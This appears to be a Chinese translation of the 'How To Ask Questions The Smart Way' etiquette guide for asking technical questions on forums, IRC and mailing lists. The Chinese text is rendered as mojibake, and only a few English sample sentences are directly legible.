æœ‰å¸®åŠ©ï¼Œç‚¹å‡»å‘ä¸Šçš„ç®­å¤´æ¥ä¸ºå®ƒæŠ•ç¥¨ï¼›å¦‚æœä¸€ä¸ªç­”æ¡ˆæä¾›äº†é—®é¢˜çš„æ­£ç¡®è§£å†³æ–¹æ¡ˆï¼Œç‚¹å‡»æŠ•ç¥¨æŒ‰é’®ä¸‹æ–¹çš„å¯¹å‹¾æ¥å°†å®ƒæ ‡è®°ä¸ºæ­£è§£ã€‚\nStack Exchange å·²ç»æˆé•¿åˆ°è¶…è¿‡ä¸€ç™¾ä¸ªç½‘ç«™ï¼Œä»¥ä¸‹æ˜¯æœ€å¸¸ç”¨çš„å‡ ä¸ªç«™ï¼š\nSuper User æ˜¯é—®ä¸€äº›é€šç”¨çš„ç”µè„‘é—®é¢˜ï¼Œå¦‚æœä½ çš„é—®é¢˜è·Ÿä»£ç æˆ–æ˜¯å†™ç¨‹åºæ— å…³ï¼Œåªæ˜¯ä¸€äº›ç½‘ç»œè¿çº¿ä¹‹ç±»çš„ï¼Œè¯·åˆ°è¿™é‡Œã€‚ Stack Overflow æ˜¯é—®å†™ç¨‹åºæœ‰å…³çš„é—®é¢˜ã€‚ Server Fault æ˜¯é—®æœåŠ¡å™¨å’Œç½‘ç®¡ç›¸å…³çš„é—®é¢˜ã€‚ ç½‘ç«™å’Œ IRC è®ºå› æœ¬åœ°çš„ç”¨æˆ·ç¾¤ç»„ï¼ˆuser groupï¼‰ï¼Œæˆ–è€…ä½ æ‰€ç”¨çš„ Linux å‘è¡Œç‰ˆæœ¬ä¹Ÿè®¸æ­£åœ¨å®£ä¼ ä»–ä»¬çš„ç½‘é¡µè®ºå›æˆ– IRC é¢‘é“ï¼Œå¹¶æä¾›æ–°æ‰‹å¸®åŠ©ï¼ˆåœ¨ä¸€äº›éè‹±è¯­å›½å®¶ï¼Œæ–°æ‰‹è®ºå›å¾ˆå¯èƒ½è¿˜æ˜¯é‚®ä»¶åˆ—è¡¨ï¼‰ï¼Œè¿™äº›éƒ½æ˜¯å¼€å§‹æé—®çš„å¥½åœ°æ–¹ï¼Œç‰¹åˆ«æ˜¯å½“ä½ è§‰å¾—é‡åˆ°çš„ä¹Ÿè®¸åªæ˜¯ç›¸å¯¹ç®€å•æˆ–è€…å¾ˆæ™®é€šçš„é—®é¢˜æ—¶ã€‚æœ‰å¹¿å‘ŠèµåŠ©çš„ IRC é¢‘é“æ˜¯å…¬å¼€æ¬¢è¿æé—®çš„åœ°æ–¹ï¼Œé€šå¸¸å¯ä»¥å³æ—¶å¾—åˆ°å›åº”ã€‚\näº‹å®ä¸Šï¼Œå¦‚æœç¨‹åºå‡ºçš„é—®é¢˜åªå‘ç”Ÿåœ¨ç‰¹å®š Linux å‘è¡Œç‰ˆæä¾›çš„ç‰ˆæœ¬ï¼ˆè¿™å¾ˆå¸¸è§ï¼‰ï¼Œæœ€å¥½å…ˆå»è¯¥å‘è¡Œç‰ˆçš„è®ºå›æˆ–é‚®ä»¶åˆ—è¡¨ä¸­æé—®ï¼Œå†åˆ°ç¨‹åºæœ¬èº«çš„è®ºå›æˆ–é‚®ä»¶åˆ—è¡¨æé—®ã€‚ï¼ˆå¦åˆ™ï¼‰è¯¥é¡¹ç›®çš„é»‘å®¢å¯èƒ½ä»…ä»…å›å¤â€œä½¿ç”¨æˆ‘ä»¬çš„ç‰ˆæœ¬â€ã€‚\nåœ¨ä»»ä½•è®ºå›å‘æ–‡ä»¥å‰ï¼Œå…ˆç¡®è®¤ä¸€ä¸‹æœ‰æ²¡æœ‰æœç´¢åŠŸèƒ½ã€‚å¦‚æœæœ‰ï¼Œå°±è¯•ç€æœç´¢ä¸€ä¸‹é—®é¢˜çš„å‡ ä¸ªå…³é”®è¯ï¼Œä¹Ÿè®¸è¿™ä¼šæœ‰å¸®åŠ©ã€‚å¦‚æœåœ¨æ­¤ä¹‹å‰ä½ å·²åšè¿‡é€šç”¨çš„ç½‘é¡µæœç´¢ï¼ˆä½ ä¹Ÿè¯¥è¿™æ ·åšï¼‰ï¼Œè¿˜æ˜¯å†æœç´¢ä¸€ä¸‹è®ºå›ï¼Œæœç´¢å¼•æ“æœ‰å¯èƒ½æ²¡æ¥å¾—åŠç´¢å¼•æ­¤è®ºå›çš„å…¨éƒ¨å†…å®¹ã€‚\né€šè¿‡è®ºå›æˆ– IRC é¢‘é“æ¥æä¾›ç”¨æˆ·æ”¯æŒæœåŠ¡æœ‰å¢é•¿çš„è¶‹åŠ¿ï¼Œç”µå­é‚®ä»¶åˆ™å¤§å¤šä¸ºé¡¹ç›®å¼€å‘è€…é—´çš„äº¤æµè€Œä¿ç•™ã€‚æ‰€ä»¥æœ€å¥½å…ˆåœ¨è®ºå›æˆ– IRC ä¸­å¯»æ±‚ä¸è¯¥é¡¹ç›®ç›¸å…³çš„ååŠ©ã€‚\nåœ¨ä½¿ç”¨ IRC çš„æ—¶å€™ï¼Œé¦–å…ˆæœ€å¥½ä¸è¦å‘å¸ƒå¾ˆé•¿çš„é—®é¢˜æè¿°ï¼Œæœ‰äº›äººç§°ä¹‹ä¸ºé¢‘é“æ´ªæ°´ã€‚æœ€å¥½é€šè¿‡ä¸€å¥è¯çš„é—®é¢˜æè¿°æ¥å¼€å§‹èŠå¤©ã€‚\nç¬¬äºŒæ­¥ï¼Œä½¿ç”¨é¡¹ç›®é‚®ä»¶åˆ—è¡¨ å½“æŸä¸ªé¡¹ç›®æä¾›å¼€å‘è€…é‚®ä»¶åˆ—è¡¨æ—¶ï¼Œè¦å‘åˆ—è¡¨è€Œä¸æ˜¯å…¶ä¸­çš„ä¸ªåˆ«æˆå‘˜æé—®ï¼Œå³ä½¿ä½ ç¡®ä¿¡ä»–èƒ½æœ€å¥½åœ°å›ç­”ä½ çš„é—®é¢˜ã€‚æŸ¥ä¸€æŸ¥é¡¹ç›®çš„æ–‡ä»¶å’Œé¦–é¡µï¼Œæ‰¾åˆ°é¡¹ç›®çš„é‚®ä»¶åˆ—è¡¨å¹¶ä½¿ç”¨å®ƒã€‚æœ‰å‡ ä¸ªå¾ˆå¥½çš„ç†ç”±æ”¯æŒæˆ‘ä»¬é‡‡ç”¨è¿™ç§åŠæ³•ï¼š\nä»»ä½•å¥½åˆ°éœ€è¦å‘ä¸ªåˆ«å¼€å‘è€…æå‡ºçš„é—®é¢˜ï¼Œä¹Ÿå°†å¯¹æ•´ä¸ªé¡¹ç›®ç¾¤ç»„æœ‰ç›Šã€‚åä¹‹ï¼Œå¦‚æœä½ è®¤ä¸ºè‡ªå·±çš„é—®é¢˜å¯¹æ•´ä¸ªé¡¹ç›®ç¾¤ç»„æ¥è¯´å¤ªæ„šè ¢ï¼Œé‚£è¿™ä¹Ÿä¸èƒ½æˆä¸ºéªšæ‰°ä¸ªåˆ«å¼€å‘è€…çš„ç†ç”±ã€‚ å‘åˆ—è¡¨æé—®å¯ä»¥åˆ†æ•£å¼€å‘è€…çš„è´Ÿæ‹…ï¼Œä¸ªåˆ«å¼€å‘è€…ï¼ˆå°¤å…¶æ˜¯é¡¹ç›®é¢†å¯¼äººï¼‰ä¹Ÿè®¸å¤ªå¿™ä»¥è‡³äºæ²¡æ³•å›ç­”ä½ çš„é—®é¢˜ã€‚ å¤§å¤šæ•°é‚®ä»¶åˆ—è¡¨éƒ½ä¼šè¢«å­˜æ¡£ï¼Œé‚£äº›è¢«å­˜æ¡£çš„å†…å®¹å°†è¢«æœç´¢å¼•æ“ç´¢å¼•ã€‚å¦‚æœä½ å‘åˆ—è¡¨æé—®å¹¶å¾—åˆ°è§£ç­”ï¼Œå°†æ¥å…¶ä»–äººå¯ä»¥é€šè¿‡ç½‘é¡µæœç´¢æ‰¾åˆ°ä½ çš„é—®é¢˜å’Œç­”æ¡ˆï¼Œä¹Ÿå°±ä¸ç”¨å†æ¬¡å‘é—®äº†ã€‚ å¦‚æœæŸäº›é—®é¢˜ç»å¸¸è¢«é—®åˆ°ï¼Œå¼€å‘è€…å¯ä»¥åˆ©ç”¨æ­¤ä¿¡æ¯æ¥æ”¹è¿›è¯´æ˜æ–‡ä»¶æˆ–è½¯ä»¶æœ¬èº«ï¼Œä»¥ä½¿å…¶æ›´æ¸…æ¥šã€‚å¦‚æœåªæ˜¯ç§ä¸‹æé—®ï¼Œå°±æ²¡æœ‰äººèƒ½çœ‹åˆ°æœ€å¸¸è§é—®é¢˜çš„å®Œæ•´åœºæ™¯ã€‚ å¦‚æœä¸€ä¸ªé¡¹ç›®æ—¢æœ‰â€œç”¨æˆ·â€ä¹Ÿæœ‰â€œå¼€å‘è€…â€ï¼ˆæˆ–â€œé»‘å®¢â€ï¼‰é‚®ä»¶åˆ—è¡¨æˆ–è®ºå›ï¼Œè€Œä½ åˆä¸ä¼šåŠ¨åˆ°é‚£äº›æºä»£ç ï¼Œé‚£ä¹ˆå°±å‘â€œç”¨æˆ·â€åˆ—è¡¨æˆ–è®ºå›æé—®ã€‚ä¸è¦å‡è®¾è‡ªå·±ä¼šåœ¨å¼€å‘è€…åˆ—è¡¨ä¸­å—åˆ°æ¬¢è¿ï¼Œé‚£äº›äººå¤šåŠä¼šå°†ä½ çš„æé—®è§†ä¸ºå¹²æ‰°ä»–ä»¬å¼€å‘çš„å™ªéŸ³ã€‚\nç„¶è€Œï¼Œå¦‚æœä½ ç¡®ä¿¡ä½ çš„é—®é¢˜å¾ˆç‰¹åˆ«ï¼Œè€Œä¸”åœ¨â€œç”¨æˆ·â€åˆ—è¡¨æˆ–è®ºå›ä¸­å‡ å¤©éƒ½æ²¡æœ‰å›å¤ï¼Œå¯ä»¥è¯•è¯•å‰å¾€â€œå¼€å‘è€…â€åˆ—è¡¨æˆ–è®ºå›å‘é—®ã€‚å»ºè®®ä½ åœ¨å¼ è´´å‰æœ€å¥½å…ˆæš—åœ°é‡Œè§‚å¯Ÿå‡ å¤©ä»¥äº†è§£é‚£é‡Œçš„è¡Œäº‹æ–¹å¼ï¼ˆäº‹å®ä¸Šè¿™æ˜¯å‚ä¸ä»»ä½•ç§æœ‰æˆ–åŠç§æœ‰åˆ—è¡¨çš„å¥½ä¸»æ„ï¼‰\nå¦‚æœä½ æ‰¾ä¸åˆ°ä¸€ä¸ªé¡¹ç›®çš„é‚®ä»¶åˆ—è¡¨ï¼Œè€Œåªèƒ½æŸ¥åˆ°é¡¹ç›®ç»´æŠ¤è€…çš„ç”µå­é‚®ä»¶åœ°å€ï¼Œå°½ç®¡å‘ä»–å‘ä¿¡ã€‚å³ä½¿æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¹Ÿåˆ«å‡è®¾ï¼ˆé¡¹ç›®ï¼‰é‚®ä»¶åˆ—è¡¨ä¸å­˜åœ¨ã€‚åœ¨ä½ çš„ç”µå­é‚®ä»¶ä¸­ï¼Œè¯·é™ˆè¿°ä½ å·²ç»è¯•è¿‡ä½†æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„é‚®ä»¶åˆ—è¡¨ï¼Œä¹ŸæåŠä½ ä¸åå¯¹å°†è‡ªå·±çš„é‚®ä»¶è½¬å‘ç»™ä»–äººï¼ˆè®¸å¤šäººè®¤ä¸ºï¼Œå³ä½¿æ²¡ä»€ä¹ˆç§˜å¯†ï¼Œç§äººç”µå­é‚®ä»¶ä¹Ÿä¸åº”è¯¥è¢«å…¬å¼€ã€‚é€šè¿‡å…è®¸å°†ä½ çš„ç”µå­é‚®ä»¶è½¬å‘ä»–äººï¼Œä½ ç»™äº†ç›¸åº”äººå‘˜å¤„ç½®ä½ é‚®ä»¶çš„é€‰æ‹©ï¼‰ã€‚\nä½¿ç”¨æœ‰æ„ä¹‰ä¸”æè¿°æ˜ç¡®çš„æ ‡é¢˜ åœ¨é‚®ä»¶åˆ—è¡¨ã€æ–°é—»ç¾¤ç»„æˆ–è®ºå›ä¸­ï¼Œå¤§çº¦ 50 å­—ä»¥å†…çš„æ ‡é¢˜æ˜¯æŠ“ä½èµ„æ·±ä¸“å®¶æ³¨æ„åŠ›çš„å¥½æœºä¼šã€‚åˆ«ç”¨å–‹å–‹ä¸ä¼‘çš„å¸®å¸®å¿™ã€è·ªæ±‚ã€æ€¥ï¼ˆæ›´åˆ«è¯´æ•‘å‘½å•Šï¼ï¼ï¼ï¼è¿™æ ·è®©äººåæ„Ÿçš„è¯ï¼Œç”¨è¿™ç§æ ‡é¢˜ä¼šè¢«æ¡ä»¶åå°„å¼åœ°å¿½ç•¥ï¼‰æ¥æµªè´¹è¿™ä¸ªæœºä¼šã€‚ä¸è¦å¦„æƒ³ç”¨ä½ çš„ç—›è‹¦ç¨‹åº¦æ¥æ‰“åŠ¨æˆ‘ä»¬ï¼Œè€Œåº”è¯¥æ˜¯åœ¨è¿™ç‚¹ç©ºé—´ä¸­ä½¿ç”¨æç®€å•æ‰¼è¦çš„æè¿°æ–¹å¼æ¥æå‡ºé—®é¢˜ã€‚\nä¸€ä¸ªå¥½æ ‡é¢˜èŒƒä¾‹æ˜¯ç›®æ ‡ â€”â€” å·®å¼‚å¼çš„æè¿°ï¼Œè®¸å¤šæŠ€æœ¯æ”¯æŒç»„ç»‡å°±æ˜¯è¿™æ ·åšçš„ã€‚åœ¨ç›®æ ‡éƒ¨åˆ†æŒ‡å‡ºæ˜¯å“ªä¸€ä¸ªæˆ–å“ªä¸€ç»„ä¸œè¥¿æœ‰é—®é¢˜ï¼Œåœ¨å·®å¼‚éƒ¨åˆ†åˆ™æè¿°ä¸æœŸæœ›çš„è¡Œä¸ºä¸ä¸€è‡´çš„åœ°æ–¹ã€‚\nè ¢é—®é¢˜ï¼šæ•‘å‘½å•Šï¼æˆ‘çš„ç¬”è®°æœ¬ç”µè„‘ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºäº†ï¼\nèªæ˜é—®é¢˜ï¼šX.org 6.8.1 çš„é¼ æ ‡æŒ‡é’ˆä¼šå˜å½¢ï¼ŒæŸç‰Œæ˜¾å¡ MV1005 èŠ¯ç‰‡ç»„ã€‚\næ›´èªæ˜é—®é¢˜ï¼šX.org 6.8.1 çš„é¼ æ ‡æŒ‡é’ˆï¼Œåœ¨æŸç‰Œæ˜¾å¡ MV1005 èŠ¯ç‰‡ç»„ç¯å¢ƒä¸‹ - ä¼šå˜å½¢ã€‚\nç¼–å†™ç›®æ ‡ â€”â€” å·®å¼‚ å¼æè¿°çš„è¿‡ç¨‹æœ‰åŠ©äºä½ ç»„ç»‡å¯¹é—®é¢˜çš„ç»†è‡´æ€è€ƒã€‚æ˜¯ä»€ä¹ˆè¢«å½±å“äº†ï¼Ÿ ä»…ä»…æ˜¯é¼ æ ‡æŒ‡é’ˆæˆ–è€…è¿˜æœ‰å…¶å®ƒå›¾å½¢ï¼Ÿåªåœ¨ X.org çš„ X ç‰ˆä¸­å‡ºç°ï¼Ÿæˆ–åªæ˜¯å‡ºç°åœ¨ 6.8.1 ç‰ˆä¸­ï¼Ÿ æ˜¯é’ˆå¯¹æŸç‰Œæ˜¾å¡èŠ¯ç‰‡ç»„ï¼Ÿæˆ–è€…åªæ˜¯å…¶ä¸­çš„ MV1005 å‹å·ï¼Ÿ ä¸€ä¸ªé»‘å®¢åªéœ€ç„ä¸€çœ¼å°±èƒ½å¤Ÿç«‹å³æ˜ç™½ä½ çš„ç¯å¢ƒå’Œä½ é‡åˆ°çš„é—®é¢˜ã€‚\næ€»è€Œè¨€ä¹‹ï¼Œè¯·æƒ³åƒä¸€ä¸‹ä½ æ­£åœ¨ä¸€ä¸ªåªæ˜¾ç¤ºæ ‡é¢˜çš„å­˜æ¡£è®¨è®ºä¸²ï¼ˆThreadï¼‰ç´¢å¼•ä¸­æŸ¥å¯»ã€‚è®©ä½ çš„æ ‡é¢˜æ›´å¥½åœ°åæ˜ é—®é¢˜ï¼Œå¯ä½¿ä¸‹ä¸€ä¸ªæœç´¢ç±»ä¼¼é—®é¢˜çš„äººèƒ½å¤Ÿå…³æ³¨è¿™ä¸ªè®¨è®ºä¸²ï¼Œè€Œä¸ç”¨å†æ¬¡æé—®ç›¸åŒçš„é—®é¢˜ã€‚\nå¦‚æœä½ æƒ³åœ¨å›å¤ä¸­æå‡ºé—®é¢˜ï¼Œè®°å¾—è¦ä¿®æ”¹å†…å®¹æ ‡é¢˜ï¼Œä»¥è¡¨æ˜ä½ æ˜¯åœ¨é—®ä¸€ä¸ªé—®é¢˜ï¼Œ ä¸€ä¸ªçœ‹èµ·æ¥åƒ Re: æµ‹è¯• æˆ–è€… Re: æ–° bug çš„æ ‡é¢˜å¾ˆéš¾å¼•èµ·è¶³å¤Ÿé‡è§†ã€‚å¦å¤–ï¼Œåœ¨ä¸å½±å“è¿è´¯æ€§ä¹‹ä¸‹ï¼Œé€‚å½“å¼•ç”¨å¹¶åˆ å‡å‰æ–‡çš„å†…å®¹ï¼Œèƒ½ç»™æ–°æ¥çš„è¯»è€…ç•™ä¸‹çº¿ç´¢ã€‚\nå¯¹äºè®¨è®ºä¸²ï¼Œä¸è¦ç›´æ¥ç‚¹å‡»å›å¤æ¥å¼€å§‹ä¸€ä¸ªå…¨æ–°çš„è®¨è®ºä¸²ï¼Œè¿™å°†é™åˆ¶ä½ çš„è§‚ä¼—ã€‚å› ä¸ºæœ‰äº›é‚®ä»¶é˜…è¯»ç¨‹åºï¼Œæ¯”å¦‚ mutt ï¼Œå…è®¸ç”¨æˆ·æŒ‰è®¨è®ºä¸²æ’åºå¹¶é€šè¿‡æŠ˜å è®¨è®ºä¸²æ¥éšè—æ¶ˆæ¯ï¼Œè¿™æ ·åšçš„äººæ°¸è¿œçœ‹ä¸åˆ°ä½ å‘çš„æ¶ˆæ¯ã€‚\nä»…ä»…æ”¹å˜æ ‡é¢˜è¿˜ä¸å¤Ÿã€‚mutt å’Œå…¶å®ƒä¸€äº›é‚®ä»¶é˜…è¯»ç¨‹åºè¿˜ä¼šæ£€æŸ¥é‚®ä»¶æ ‡é¢˜ä»¥å¤–çš„å…¶å®ƒä¿¡æ¯ï¼Œä»¥ä¾¿ä¸ºå…¶æŒ‡å®šè®¨è®ºä¸²ã€‚æ‰€ä»¥å®å¯å‘ä¸€ä¸ªå…¨æ–°çš„é‚®ä»¶ã€‚\nåœ¨ç½‘é¡µè®ºå›ä¸Šï¼Œå¥½çš„æé—®æ–¹å¼ç¨æœ‰ä¸åŒï¼Œå› ä¸ºè®¨è®ºä¸²ä¸ç‰¹å®šçš„ä¿¡æ¯ç´§å¯†ç»“åˆï¼Œå¹¶ä¸”é€šå¸¸åœ¨è®¨è®ºä¸²å¤–å°±çœ‹ä¸åˆ°é‡Œé¢çš„å†…å®¹ï¼Œæ•…é€šè¿‡å›å¤æé—®ï¼Œè€Œéæ”¹å˜æ ‡é¢˜æ˜¯å¯æ¥å—çš„ã€‚ä¸æ˜¯æ‰€æœ‰è®ºå›éƒ½å…è®¸åœ¨å›å¤ä¸­å‡ºç°åˆ†ç¦»çš„æ ‡é¢˜ï¼Œè€Œä¸”è¿™æ ·åšäº†åŸºæœ¬ä¸Šæ²¡æœ‰äººä¼šå»çœ‹ã€‚ä¸è¿‡ï¼Œé€šè¿‡å›å¤æé—®ï¼Œè¿™æœ¬èº«å°±æ˜¯æš§æ˜§çš„åšæ³•ï¼Œå› ä¸ºå®ƒä»¬åªä¼šè¢«æ­£åœ¨æŸ¥çœ‹è¯¥æ ‡é¢˜çš„äººè¯»åˆ°ã€‚æ‰€ä»¥ï¼Œé™¤éä½ åªæƒ³åœ¨è¯¥è®¨è®ºä¸²å½“å‰æ´»è·ƒçš„äººç¾¤ä¸­æé—®ï¼Œä¸ç„¶è¿˜æ˜¯å¦èµ·ç‚‰ç¶æ¯”è¾ƒå¥½ã€‚\nä½¿é—®é¢˜å®¹æ˜“å›å¤ ä»¥è¯·å°†ä½ çš„å›å¤å‘é€åˆ°â€¦â€¦æ¥ç»“æŸä½ çš„é—®é¢˜å¤šåŠä¼šä½¿ä½ å¾—ä¸åˆ°å›ç­”ã€‚å¦‚æœä½ è§‰å¾—èŠ±å‡ ç§’é’Ÿåœ¨é‚®ä»¶å®¢æˆ·ç«¯è®¾ç½®ä¸€ä¸‹å›å¤åœ°å€éƒ½éº»çƒ¦ï¼Œæˆ‘ä»¬ä¹Ÿè§‰å¾—èŠ±å‡ ç§’é’Ÿæ€è€ƒä½ çš„é—®é¢˜æ›´éº»çƒ¦ã€‚å¦‚æœä½ çš„é‚®ä»¶ç¨‹åºä¸æ”¯æŒè¿™æ ·åšï¼Œæ¢ä¸ªå¥½ç‚¹çš„ï¼›å¦‚æœæ˜¯æ“ä½œç³»ç»Ÿä¸æ”¯æŒè¿™ç§é‚®ä»¶ç¨‹åºï¼Œä¹Ÿæ¢ä¸ªå¥½ç‚¹çš„ã€‚\nåœ¨è®ºå›ï¼Œè¦æ±‚é€šè¿‡ç”µå­é‚®ä»¶å›å¤æ˜¯éå¸¸æ— ç¤¼çš„ï¼Œé™¤éä½ è®¤ä¸ºå›å¤çš„ä¿¡æ¯å¯èƒ½æ¯”è¾ƒæ•æ„Ÿï¼ˆæœ‰äººä¼šä¸ºäº†æŸäº›æœªçŸ¥çš„åŸå› ï¼Œåªè®©ä½ è€Œä¸æ˜¯æ•´ä¸ªè®ºå›çŸ¥é“ç­”æ¡ˆï¼‰ã€‚å¦‚æœä½ åªæ˜¯æƒ³åœ¨æœ‰äººå›å¤è®¨è®ºä¸²æ—¶å¾—åˆ°ç”µå­é‚®ä»¶æé†’ï¼Œå¯ä»¥è¦æ±‚ç½‘é¡µè®ºå›å‘é€ç»™ä½ ã€‚å‡ ä¹æ‰€æœ‰è®ºå›éƒ½æ”¯æŒè¯¸å¦‚è¿½è¸ªæ­¤è®¨è®ºä¸²ã€æœ‰å›å¤æ—¶å‘é€é‚®ä»¶æé†’ç­‰åŠŸèƒ½ã€‚\nä½¿ç”¨æ¸…æ™°ã€æ­£ç¡®ã€ç²¾å‡†ä¸”åˆä¹è¯­æ³•çš„è¯­å¥ æˆ‘ä»¬ä»ç»éªŒä¸­å‘ç°ï¼Œç²—å¿ƒçš„æé—®è€…é€šå¸¸ä¹Ÿä¼šç²—å¿ƒåœ°å†™ç¨‹åºä¸æ€è€ƒï¼ˆæˆ‘æ•¢æ‰“åŒ…ç¥¨ï¼‰ã€‚å›ç­”ç²—å¿ƒå¤§æ„è€…çš„é—®é¢˜å¾ˆä¸å€¼å¾—ï¼Œæˆ‘ä»¬å®æ„¿æŠŠæ—¶é—´è€—åœ¨åˆ«å¤„ã€‚\næ­£ç¡®çš„æ‹¼å†™ã€æ ‡ç‚¹ç¬¦å·å’Œå¤§å°å†™æ˜¯å¾ˆé‡è¦çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœä½ è§‰å¾—è¿™æ ·åšå¾ˆéº»çƒ¦ï¼Œä¸æƒ³åœ¨ä¹è¿™äº›ï¼Œé‚£æˆ‘ä»¬ä¹Ÿè§‰å¾—éº»çƒ¦ï¼Œä¸æƒ³åœ¨ä¹ä½ çš„æé—®ã€‚èŠ±ç‚¹é¢å¤–çš„ç²¾åŠ›æ–Ÿé…Œä¸€ä¸‹å­—å¥ï¼Œç”¨ä¸ç€å¤ªåƒµç¡¬ä¸æ­£å¼ â€”â€” äº‹å®ä¸Šï¼Œé»‘å®¢æ–‡åŒ–å¾ˆçœ‹é‡èƒ½å‡†ç¡®åœ°ä½¿ç”¨éæ­£å¼ã€ä¿šè¯­å’Œå¹½é»˜çš„è¯­å¥ã€‚ä½†å®ƒå¿…é¡»å¾ˆå‡†ç¡®ï¼Œè€Œä¸”æœ‰è¿¹è±¡è¡¨æ˜ä½ æ˜¯åœ¨æ€è€ƒå’Œå…³æ³¨é—®é¢˜ã€‚\næ­£ç¡®åœ°æ‹¼å†™ã€ä½¿ç”¨æ ‡ç‚¹å’Œå¤§å°å†™ï¼Œä¸è¦å°†itsæ··æ·†ä¸ºit'sï¼Œlooseææˆloseæˆ–è€…å°†discreteå¼„æˆdiscreetã€‚ä¸è¦å…¨éƒ¨ç”¨å¤§å†™ï¼Œè¿™ä¼šè¢«è§†ä¸ºæ— ç¤¼çš„å¤§å£°åš·åš·ï¼ˆå…¨éƒ¨å°å†™ä¹Ÿå¥½ä¸åˆ°å“ªå»ï¼Œå› ä¸ºä¸æ˜“é˜…è¯»ã€‚Alan Cox ä¹Ÿè®¸å¯ä»¥è¿™æ ·åšï¼Œä½†ä½ ä¸è¡Œï¼‰ã€‚\næ›´ç™½è¯çš„è¯´ï¼Œå¦‚æœä½ å†™å¾—åƒæ˜¯ä¸ªåŠæ–‡ç›²[è¯‘æ³¨ï¼šå°ç™½]ï¼Œé‚£å¤šåŠå¾—ä¸åˆ°ç†ç¬ã€‚ä¹Ÿä¸è¦ä½¿ç”¨å³æ—¶é€šä¿¡ä¸­çš„ç®€å†™æˆ–ç«æ˜Ÿæ–‡ï¼Œå¦‚å°†çš„ç®€åŒ–ä¸ºdä¼šä½¿ä½ çœ‹èµ·æ¥åƒä¸€ä¸ªä¸ºäº†å°‘æ‰“å‡ ä¸ªé”®è€Œçœå­—çš„å°ç™½ã€‚æ›´ç³Ÿçš„æ˜¯ï¼Œå¦‚æœåƒä¸ªå°å­©ä¼¼åœ°é¬¼ç”»ç¬¦é‚£ç»å¯¹æ˜¯åœ¨æ‰¾æ­»ï¼Œå¯ä»¥è‚¯å®šæ²¡äººä¼šç†ä½ ï¼ˆæˆ–è€…æœ€å¤šæ˜¯ç»™ä½ ä¸€å¤§å †æŒ‡è´£ä¸æŒ–è‹¦ï¼‰ã€‚\nå¦‚æœåœ¨ä½¿ç”¨éæ¯è¯­çš„è®ºå›æé—®ï¼Œä½ å¯ä»¥çŠ¯ç‚¹æ‹¼å†™å’Œè¯­æ³•ä¸Šçš„å°é”™ï¼Œä½†å†³ä¸èƒ½åœ¨æ€è€ƒä¸Šé©¬è™ï¼ˆæ²¡é”™ï¼Œæˆ‘ä»¬é€šå¸¸èƒ½å¼„æ¸…ä¸¤è€…çš„åˆ†åˆ«ï¼‰ã€‚åŒæ—¶ï¼Œé™¤éä½ çŸ¥é“å›å¤è€…ä½¿ç”¨çš„è¯­è¨€ï¼Œå¦åˆ™è¯·ä½¿ç”¨è‹±è¯­ä¹¦å†™ã€‚ç¹å¿™çš„é»‘å®¢ä¸€èˆ¬ä¼šç›´æ¥åˆ é™¤ç”¨ä»–ä»¬çœ‹ä¸æ‡‚çš„è¯­è¨€å†™çš„æ¶ˆæ¯ã€‚åœ¨ç½‘ç»œä¸Šè‹±è¯­æ˜¯é€šç”¨è¯­è¨€ï¼Œç”¨è‹±è¯­ä¹¦å†™å¯ä»¥å°†ä½ çš„é—®é¢˜åœ¨å°šæœªè¢«é˜…è¯»å°±è¢«ç›´æ¥åˆ é™¤çš„å¯èƒ½æ€§é™åˆ°æœ€ä½ã€‚\nå¦‚æœè‹±æ–‡æ˜¯ä½ çš„å¤–è¯­ï¼ˆSecond languageï¼‰ï¼Œæç¤ºæ½œåœ¨å›å¤è€…ä½ æœ‰æ½œåœ¨çš„è¯­è¨€å›°éš¾æ˜¯å¾ˆå¥½çš„ï¼š [è¯‘æ³¨ï¼šä»¥ä¸‹é™„ä¸ŠåŸæ–‡ä»¥ä¾›ä½¿ç”¨]\nEnglish is not my native language; please excuse typing errors.\nè‹±æ–‡ä¸æ˜¯æˆ‘çš„æ¯è¯­ï¼Œè¯·åŸè°…æˆ‘çš„é”™å­—æˆ–è¯­æ³•ã€‚ If you speak $LANGUAGE, please email/PM me; I may need assistance translating my question.\nå¦‚æœä½ è¯´æŸè¯­è¨€ï¼Œè¯·å‘æˆ‘å‘ç”µé‚®/ç§ä¿¡ï¼› æˆ‘éœ€è¦æœ‰äººååŠ©æˆ‘ç¿»è¯‘æˆ‘çš„é—®é¢˜ã€‚ I am familiar with the technical terms, but some slang expressions and idioms are difficult for me.\næˆ‘å¯¹æŠ€æœ¯åè¯å¾ˆç†Ÿæ‚‰ï¼Œä½†å¯¹äºä¿—è¯­æˆ–æ˜¯ç‰¹åˆ«ç”¨æ³•ä¸ç”šäº†è§£ã€‚ I\u0026rsquo;ve posted my question in $LANGUAGE and English. I\u0026rsquo;ll be glad to translate responses, if you only use one or the other.\næˆ‘æŠŠæˆ‘çš„é—®é¢˜ç”¨æŸè¯­è¨€å’Œè‹±æ–‡å†™å‡ºæ¥ã€‚ å¦‚æœä½ åªç”¨å…¶ä¸­çš„ä¸€ç§è¯­è¨€å›ç­”ï¼Œæˆ‘ä¼šä¹æ„å°†å›å¤ç¿»è¯‘æˆä¸ºä½ ä½¿ç”¨çš„è¯­è¨€ã€‚ ä½¿ç”¨æ˜“äºè¯»å–ä¸”æ ‡å‡†çš„æ–‡ä»¶æ ¼å¼å‘é€é—®é¢˜ å¦‚æœä½ äººä¸ºåœ°å°†é—®é¢˜æå¾—éš¾ä»¥é˜…è¯»ï¼Œå®ƒå¤šåŠä¼šè¢«å¿½ç•¥ï¼Œäººä»¬æ›´æ„¿è¯»æ˜“æ‡‚çš„é—®é¢˜ï¼Œæ‰€ä»¥ï¼š\nä½¿ç”¨çº¯æ–‡å­—è€Œä¸æ˜¯ HTML (å…³é—­ HTML å¹¶ä¸éš¾ï¼‰ã€‚ ä½¿ç”¨ MIME é™„ä»¶é€šå¸¸æ˜¯å¯ä»¥çš„ï¼Œå‰ææ˜¯çœŸæ­£æœ‰å†…å®¹ï¼ˆè­¬å¦‚é™„å¸¦çš„æºä»£ç æˆ– patchï¼‰ï¼Œè€Œä¸ä»…ä»…æ˜¯é‚®ä»¶ç¨‹åºç”Ÿæˆçš„æ¨¡æ¿ï¼ˆè­¬å¦‚åªæ˜¯ä¿¡ä»¶å†…å®¹çš„æ‹·è´ï¼‰ã€‚ 